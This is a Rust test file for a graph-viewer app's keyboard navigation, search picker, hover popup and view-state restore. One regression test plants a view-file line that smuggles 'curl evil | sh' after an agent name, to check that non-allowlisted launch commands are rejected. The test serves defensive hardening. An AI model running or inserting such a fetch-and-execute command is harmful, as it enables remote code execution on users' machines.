//! Viewer state-machine tests, driven through a real egui context via
//! egui_kittest — synthetic events, real frames, no window and no
//! renderer: the keyboard modal logic (handle_keys + the picker), the
//! hover-popup render path, and reload carry-over (apply_graph). The
//! harness never runs canvas — sync_terminals would attach mirrors
//! against the user's default tmux server (house rule).

use std::path::PathBuf;

use eframe::egui::Key;
use egui_kittest::Harness;
use egui_kittest::kittest::Queryable as _;
use text_graph::{graph, vault};

use super::Viewer;

fn harness() -> Harness<'static, Viewer> {
    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
    let scan = vault::scan(&root).expect("fixture scans");
    let viewer = Viewer::new(graph::build(scan), root);
    let mut h = Harness::new_ui_state(
        |ui, v: &mut Viewer| {
            v.handle_keys(ui);
            v.pump_picker(ui.ctx());
        },
        viewer,
    );
    h.step();
    h
}

fn selected_path(h: &Harness<'_, Viewer>) -> Option<String> {
    h.state()
        .selected
        .map(|id| h.state().g.node(id).path.clone())
}

fn select(h: &mut Harness<'_, Viewer>, path: &str) {
    let id = h.state().g.by_path(path).expect("path exists");
    h.state_mut().selected = Some(id);
}

fn press(h: &mut Harness<'_, Viewer>, key: Key) {
    h.key_press(key);
    h.step();
}

#[test]
fn hover_dwell_renders_a_popup_with_the_file_body() {
    use std::time::{Duration, Instant};
    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
    let scan = vault::scan(&root).expect("fixture scans");
    let viewer = Viewer::new(graph::build(scan), root);
    let mut h = Harness::new_ui_state(|ui, v: &mut Viewer| v.hover_preview_ui(ui), viewer);
    let id = h.state().g.by_path("index.md").expect("index exists");
    let since = Instant::now()
        .checked_sub(Duration::from_secs(1))
        .unwrap_or_else(Instant::now);
    h.state_mut().hover_since = Some((id, since, eframe::egui::Pos2::new(80.0, 80.0)));
    h.step();
    h.step();
    // the popup carries the display name and the rendered body; index.md's
    // body contains "Heading One"
    assert!(
        h.query_by_label("Index").is_some(),
        "popup title label missing — hover preview did not render"
    );
    assert!(
        h.query_by_label_contains("Heading One").is_some(),
        "popup body missing — file content did not render"
    );
}

#[test]
fn structure_identical_reload_keeps_sim_still_and_dwell_alive() {
    use std::time::Instant;
    let mut h = harness();
    for _ in 0..10_000 {
        if !h.state().sim.active() {
            break;
        }
        h.state_mut().sim.tick(16);
    }
    assert!(!h.state().sim.active(), "sim must settle");
    let id = h.state().g.by_path("index.md").expect("index exists");
    h.state_mut().hover_since = Some((id, Instant::now(), eframe::egui::Pos2::new(5.0, 5.0)));

    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
    let rebuilt = graph::build(vault::scan(&root).expect("rescan"));
    h.state_mut().apply_graph(rebuilt);
    assert!(
        !h.state().sim.active(),
        "an agent saving text (no structural change) must not set the graph in motion"
    );
    assert_eq!(
        h.state().hover_since.map(|(i, ..)| i),
        Some(id),
        "the hover dwell survives a reload (remapped by ident)"
    );

    // a structural change (different links) still reheats
    let mut changed = graph::build(vault::scan(&root).expect("rescan"));
    changed.links.pop();
    h.state_mut().apply_graph(changed);
    assert!(h.state().sim.active(), "structural reloads still re-settle");
}

#[test]
fn w_toggles_web_nodes() {
    let mut h = harness();
    assert!(h.state().show_web, "webs visible by default");
    press(&mut h, Key::W);
    assert!(!h.state().show_web);
    press(&mut h, Key::W);
    assert!(h.state().show_web);
}

#[test]
fn hjkl_walks_the_tree_when_a_node_is_selected() {
    let mut h = harness();
    // root's files in sorted order: bom, empty, frontmatter-only, index
    select(&mut h, "bom.md");
    press(&mut h, Key::J);
    assert_eq!(
        selected_path(&h).as_deref(),
        Some("empty.md"),
        "j = next sibling"
    );
    press(&mut h, Key::K);
    assert_eq!(selected_path(&h).as_deref(), Some("bom.md"), "k = previous");
    press(&mut h, Key::K);
    assert_eq!(
        selected_path(&h).as_deref(),
        Some("topics"),
        "k crosses from the files into the dirs — one sorted sibling list"
    );
    press(&mut h, Key::J);
    assert_eq!(selected_path(&h).as_deref(), Some("bom.md"));
    press(&mut h, Key::H);
    assert_eq!(
        selected_path(&h).as_deref(),
        Some(""),
        "h = parent (vault root)"
    );
    press(&mut h, Key::L);
    assert_eq!(
        selected_path(&h).as_deref(),
        Some("assets"),
        "l enters the root: first child, dirs-first order"
    );
    // G / gg jump to the ends of the sibling list
    h.key_press_modifiers(eframe::egui::Modifiers::SHIFT, Key::G);
    h.step();
    assert_eq!(
        selected_path(&h).as_deref(),
        Some("index.md"),
        "G = last sibling"
    );
    press(&mut h, Key::G);
    press(&mut h, Key::G);
    assert_eq!(
        selected_path(&h).as_deref(),
        Some("assets"),
        "gg = first sibling"
    );
}

#[test]
fn hjkl_pans_the_camera_when_nothing_is_selected() {
    let mut h = harness();
    assert!(h.state().selected.is_none());
    let x0 = h.state().center.x;
    h.key_down(Key::H);
    h.run_steps(3);
    h.key_up(Key::H);
    h.step();
    assert!(h.state().center.x < x0, "h pans left with no selection");

    // with a selection, the same key walks the tree and the camera recenters
    // on the node instead of free-panning
    select(&mut h, "bom.md");
    let sel_before = selected_path(&h);
    press(&mut h, Key::J);
    assert_ne!(selected_path(&h), sel_before, "j navigates, not pans");
}

#[test]
fn brackets_walk_connections_and_enter_follows() {
    let mut h = harness();
    select(&mut h, "index.md");
    // index.md is a file: connections = 4 outlinks (body order), then backlinks
    press(&mut h, Key::CloseBracket);
    assert_eq!(h.state().conn_cursor, Some(0));
    press(&mut h, Key::CloseBracket);
    assert_eq!(h.state().conn_cursor, Some(1), "] steps forward");
    press(&mut h, Key::OpenBracket);
    assert_eq!(h.state().conn_cursor, Some(0), "[ steps back");
    press(&mut h, Key::OpenBracket);
    assert_eq!(h.state().conn_cursor, Some(0), "clamped at the start");
    press(&mut h, Key::Enter);
    assert_eq!(
        selected_path(&h).as_deref(),
        Some("projects/rust-app.md"),
        "Enter follows the highlighted connection (index.md's first outlink)"
    );
    assert_eq!(h.state().conn_cursor, None, "consumed by the jump");

    // tree moves dismiss a live link cursor
    press(&mut h, Key::CloseBracket);
    assert!(h.state().conn_cursor.is_some());
    press(&mut h, Key::J);
    assert_eq!(h.state().conn_cursor, None, "j clears the link cursor");
}

#[test]
fn esc_dismisses_link_cursor_then_terminal_cursor_then_selection() {
    let mut h = harness();
    select(&mut h, "index.md");
    h.state_mut().terms.cursor = Some(("tg_claude".into(), "%1".into()));
    press(&mut h, Key::CloseBracket);
    assert!(h.state().conn_cursor.is_some());

    press(&mut h, Key::Escape);
    assert_eq!(h.state().conn_cursor, None, "1st Esc: link cursor");
    assert!(h.state().terms.cursor.is_some());
    assert!(h.state().selected.is_some());

    press(&mut h, Key::Escape);
    assert_eq!(h.state().terms.cursor, None, "2nd Esc: terminal cursor");
    assert!(h.state().selected.is_some());

    press(&mut h, Key::Escape);
    assert_eq!(
        h.state().selected,
        None,
        "3rd Esc: selection — back to pan mode"
    );
}

#[test]
fn f_opens_the_find_prompt_only_in_nav_mode() {
    let mut h = harness();
    press(&mut h, Key::F);
    assert!(h.state().nav_find.is_none(), "no selection, no prompt");
    select(&mut h, "notes/readme.md");
    press(&mut h, Key::F);
    assert!(h.state().nav_find.is_some(), "f opens find-in-directory");
}

/// The view file is untrusted and the launch command runs through
/// `sh -c` — a planted `agent\tpi; …` line must not survive restore
/// (it sat behind the one-click Launch button and the `a` key).
#[test]
fn restored_default_agent_must_be_allowlisted() {
    let d = std::env::temp_dir().join(format!("tg-agent-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(d.join(".text-graph")).unwrap();
    std::fs::write(d.join("a.md"), "x").unwrap();
    std::fs::write(
        d.join(".text-graph/view"),
        "text-graph view v1\nagent\tpi; curl evil | sh\n",
    )
    .unwrap();
    let scan = vault::scan(&d).expect("scans");
    let v = Viewer::new(graph::build(scan), d.clone());
    let _ = std::fs::remove_dir_all(&d);
    assert_eq!(
        v.default_agent, "pi",
        "non-allowlisted agent string falls back to the default"
    );
}

/// A corrupt/hand-edited view file with a huge-but-finite camera center
/// used to open onto a blank canvas: world_to_screen overflowed to ±inf,
/// nothing painted or hit-tested, and fitted=true blocked the auto-fit
/// that would recover. Restore must clamp center like it clamps zoom.
#[test]
fn corrupt_view_state_camera_is_clamped_on_restore() {
    let d = std::env::temp_dir().join(format!("tg-clamp-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(d.join(".text-graph")).unwrap();
    std::fs::write(d.join("a.md"), "x").unwrap();
    std::fs::write(
        d.join(".text-graph/view"),
        "text-graph view v1\ncamera\t3e38\t-3e38\t50\ncard\t3e38\t0\t%1\ttg_x\n",
    )
    .unwrap();
    let scan = vault::scan(&d).expect("scans");
    let v = Viewer::new(graph::build(scan), d.clone());
    let _ = std::fs::remove_dir_all(&d);
    assert!(
        v.center.x.abs() <= 1e6 && v.center.y.abs() <= 1e6,
        "center clamped: was ({}, {})",
        v.center.x,
        v.center.y
    );
    assert_eq!(v.zoom, 50.0, "the sane part of the restore survives");
    let off = v.terms.parked["tg_x"][0].1;
    assert!(off.x.abs() <= 1e5, "card offsets clamped too: {}", off.x);
}

/// egui widgets read key events without consuming them, so every global
/// keybind must check `widget_free`. Regression: typing a filename like
/// "2026-08-10" into the find-in-directory prompt re-fit the camera on
/// each '0', '/' opened the search bar, 'z' framed, and Esc deselected —
/// slamming the navigator shut mid-typing.
#[test]
fn global_keys_do_not_fire_while_a_text_field_has_focus() {
    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
    let scan = vault::scan(&root).expect("fixture scans");
    let viewer = Viewer::new(graph::build(scan), root);
    let mut h = Harness::new_ui_state(
        |ui, v: &mut Viewer| {
            v.handle_keys(ui);
            // a stand-in for the find prompt: any focused TextEdit
            ui.text_edit_singleline(&mut v.nav_find_last)
                .request_focus();
        },
        viewer,
    );
    h.step();
    select(&mut h, "index.md");
    h.state_mut().fitted = true;
    h.step();

    press(&mut h, Key::Num0);
    assert!(
        h.state().fitted,
        "'0' while typing must not re-fit the camera"
    );
    press(&mut h, Key::Slash);
    assert!(
        !h.state().picker.open,
        "'/' while typing must not open the picker"
    );
    press(&mut h, Key::Z);
    assert!(
        h.state().cam_anim.is_none(),
        "'z' while typing must not start a camera glide"
    );
    // Esc is special: egui surrenders widget focus at frame START on
    // Escape, so the focus guard alone can't see the prompt — the find
    // prompt must be its own stage of the dismiss chain
    h.state_mut().nav_find = Some("2026".into());
    press(&mut h, Key::Escape);
    assert!(
        h.state().nav_find.is_none(),
        "Esc closes the find prompt first…"
    );
    assert_eq!(
        selected_path(&h).as_deref(),
        Some("index.md"),
        "…without deselecting (the navigator must not slam shut)"
    );
}

/// Step frames until `done` holds — the content scan runs on a worker
/// thread, so its results land some frames after the query is typed.
fn wait_for(h: &mut Harness<'_, Viewer>, what: &str, done: impl Fn(&Viewer) -> bool) {
    for _ in 0..200 {
        h.step();
        if done(h.state()) {
            return;
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
    panic!("timed out waiting for {what}");
}

#[test]
fn picker_enter_jumps_to_the_top_result_and_clears_a_stale_term_cursor() {
    let mut h = harness();
    h.state_mut().terms.cursor = Some(("tg_x".into(), "%9".into()));
    press(&mut h, Key::Slash);
    assert!(h.state().picker.open, "'/' opens the picker");
    h.state_mut().picker.query = "grafer".into();
    h.step(); // rebuild scores the query against every name
    let top = h.state().picker.rows.first().expect("a match").key.clone();
    assert_eq!(top, "topics/grafér.md", "the name match ranks first");

    press(&mut h, Key::Enter);
    assert_eq!(
        selected_path(&h).as_deref(),
        Some("topics/grafér.md"),
        "Enter jumps to the highlighted result"
    );
    assert!(!h.state().picker.open, "picker closed");
    assert!(h.state().picker.query.is_empty(), "and reset");
    assert_eq!(
        h.state().terms.cursor,
        None,
        "a stale terminal cursor must not hijack the next Enter"
    );
}

/// The whole point of the feature: words inside a note find the note, with
/// the matching line and its number attached to the row.
#[test]
fn content_search_finds_words_inside_notes() {
    let mut h = harness();
    press(&mut h, Key::Slash);
    h.state_mut().picker.query = "Heading One".into();
    wait_for(&mut h, "the content scan", |v| {
        v.picker.rows.iter().any(|r| r.snippet.is_some())
    });
    let row = h
        .state()
        .picker
        .rows
        .iter()
        .find(|r| r.snippet.is_some())
        .cloned()
        .expect("a content hit");
    let hit = row.snippet.expect("snippet");
    assert!(hit.text.contains("Heading One"));
    assert!(hit.line >= 1, "1-based line number for the editor jump");
    assert!(
        h.state().picker.node_scores.iter().flatten().count() >= 1,
        "matching nodes light up on the canvas"
    );
}

/// Arrowing through results moves the cursor by identity and, after its
/// dwell, glides the camera — without selecting anything (a selection would
/// open the navigator and squeeze the canvas the picker previews into).
#[test]
fn arrows_walk_results_and_the_camera_follows_after_a_dwell() {
    let mut h = harness();
    press(&mut h, Key::Slash);
    h.state_mut().picker.query = "e".into();
    h.step();
    assert!(h.state().picker.rows.len() > 1, "several matches");
    let first = h.state().picker.rows[0].key.clone();
    press(&mut h, Key::ArrowDown);
    assert_eq!(h.state().picker.cursor, 1, "↓ steps down");
    assert_ne!(
        h.state().picker.cursor_row().unwrap().key,
        first,
        "onto a different result"
    );
    press(&mut h, Key::ArrowUp);
    assert_eq!(h.state().picker.cursor, 0, "↑ steps back");
    press(&mut h, Key::ArrowUp);
    assert_eq!(h.state().picker.cursor, 0, "clamped at the top");
    assert!(h.state().selected.is_none(), "browsing selects nothing");

    // the glide starts only once the cursor has settled on a row
    h.state_mut().cam_anim = None;
    wait_for(&mut h, "the camera glide", |v| v.cam_anim.is_some());
}

#[test]
fn esc_closes_the_picker_and_leaves_the_graph_alone() {
    let mut h = harness();
    select(&mut h, "index.md");
    press(&mut h, Key::Slash);
    h.state_mut().picker.query = "grafer".into();
    h.step();
    press(&mut h, Key::Escape);
    assert!(!h.state().picker.open);
    assert!(h.state().picker.rows.is_empty(), "results dropped");
    assert!(
        h.state().picker.node_scores.iter().all(Option::is_none),
        "the canvas lit mask goes dark"
    );
    assert_eq!(
        selected_path(&h).as_deref(),
        Some("index.md"),
        "Esc in the picker must not also deselect"
    );
}

/// Agents save files constantly: a reload lands mid-search. The rows point
/// into the old node arena and must be re-derived, but the query and the
/// row the cursor sits on have to survive it.
#[test]
fn a_reload_rebuilds_the_rows_but_keeps_query_and_cursor() {
    let mut h = harness();
    press(&mut h, Key::Slash);
    h.state_mut().picker.query = "grafer".into();
    h.step();
    let before = h.state().picker.cursor_row().expect("a row").key.clone();

    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
    let rebuilt = graph::build(vault::scan(&root).expect("rescan"));
    h.state_mut().apply_graph(rebuilt);
    h.step();
    assert_eq!(h.state().picker.query, "grafer", "the query survives");
    assert_eq!(
        h.state().picker.cursor_row().map(|r| r.key.clone()),
        Some(before),
        "and the cursor stays on the same result"
    );
}

/// The picker's own UI renders headlessly (canvas does not — it would
/// attach tmux mirrors). This exercises the real layout path: prompt,
/// virtualized result list, and the preview pane's per-line layout jobs.
#[test]
fn picker_ui_renders_prompt_results_and_preview() {
    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
    let scan = vault::scan(&root).expect("fixture scans");
    let viewer = Viewer::new(graph::build(scan), root);
    let mut h = Harness::new_ui_state(
        |ui, v: &mut Viewer| {
            v.pump_picker(ui.ctx());
            v.picker_ui(ui);
        },
        viewer,
    );
    // result rows carry file-type glyphs; the real app installs the family
    // in run(), so the harness has to as well
    super::install_icon_font(&h.ctx);
    h.state_mut().picker.open = true;
    h.state_mut().picker.query = "grafer".into();
    h.step();
    h.step();
    assert!(
        h.query_by_label_contains("result").is_some(),
        "the status line reports the match count"
    );
    assert!(
        h.query_by_label_contains("topics/grafér.md").is_some(),
        "the preview header names the previewed file"
    );
}

/// An empty prompt lists the whole vault (the picker doubles as a
/// browser) — but merely opening it must not yank the camera to the first
/// file. Arrowing through that listing on purpose still follows.
#[test]
fn an_empty_prompt_lists_the_vault_without_moving_the_camera() {
    let mut h = harness();
    press(&mut h, Key::Slash);
    h.step();
    assert_eq!(
        h.state().picker.rows.len(),
        h.state().g.nodes.len(),
        "every node is listed"
    );
    let keys: Vec<String> = h
        .state()
        .picker
        .rows
        .iter()
        .map(|r| r.key.clone())
        .collect();
    let mut sorted = keys.clone();
    sorted.sort();
    assert_eq!(keys, sorted, "listed in a deterministic order");
    assert!(
        h.state().picker.node_scores.iter().all(Option::is_none),
        "a bare listing dims nothing on the canvas"
    );

    h.state_mut().cam_anim = None;
    for _ in 0..8 {
        h.step();
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
    assert!(
        h.state().cam_anim.is_none(),
        "opening the picker must not move the camera"
    );
    press(&mut h, Key::ArrowDown);
    wait_for(&mut h, "the camera glide after a deliberate move", |v| {
        v.cam_anim.is_some()
    });
}
